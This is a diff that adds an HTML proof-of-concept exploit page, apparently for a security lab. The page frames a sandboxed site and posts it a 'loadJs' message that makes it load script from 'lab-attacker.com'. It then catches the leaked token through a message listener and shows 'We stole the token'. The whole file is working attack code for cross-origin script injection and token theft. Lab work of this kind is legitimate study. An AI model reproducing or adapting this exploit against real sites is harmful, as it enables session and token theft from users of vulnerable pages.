@@ -1,0 +1,22 @@
+<html>
+<div id="leak">
+    <iframe id="myIframe" src="http://lab-sandbox.com:9002"></iframe>
+</div>
+
+<script>
+
+    myIframe.onload = () => {
+        myIframe.contentWindow.postMessage({ type: "loadJs", jsUrl: "http://lab-attacker.com:8000/gadget2-2.js" }, "http://lab-sandbox.com:9002");
+    }
+
+    window.addEventListener('message', function (e) {
+        if (e.data) {
+            document.getElementById('leak').innerText = 'We stole the token: ' + e.data;
+        }
+    });
+</script>
+
+<body>
+</body>
+
+</html>
